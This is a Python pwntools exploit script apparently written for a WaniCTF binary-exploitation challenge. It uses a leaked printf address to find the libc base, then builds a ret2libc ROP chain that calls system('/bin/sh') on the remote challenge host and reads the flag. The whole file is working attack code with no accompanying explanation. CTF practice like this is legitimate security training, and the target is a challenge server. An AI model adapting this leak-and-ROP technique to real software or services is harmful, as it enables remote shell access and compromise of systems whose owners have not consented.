#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal-lz56g6.wanictf.org', 9005 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+521
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================




# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)
    
    io.recvuntil(b'0x')
    printf_addr = int(io.recvline().strip(), 16)
    libc.address = printf_addr - 0x600f0
    info(f'libc base: {hex(libc.address)}')
    
    ret = rop.find_gadget(['ret'])[0] + libc.address
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] + libc.address
    binsh = next(libc.search(b'/bin/sh'))
    system = libc.sym['system']
    
    info(f'pop rdi: {hex(pop_rdi)}')
    info(f'ret: {hex(ret)}')
    info(f'/bin/sh: {hex(binsh)}')
    info(f'system: {hex(system)}')
    
    payload = flat(
        pop_rdi,
        binsh,
        ret,
        system
    )
    
    for i in range(9):
        io.sendlineafter(b': ', b'.')
        
    io.sendlineafter(b': ', payload)
    io.sendlineafter(b':', b'.')
    io.sendlineafter(b':', b'.')
    
    io.sendline('cat FLAG')
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()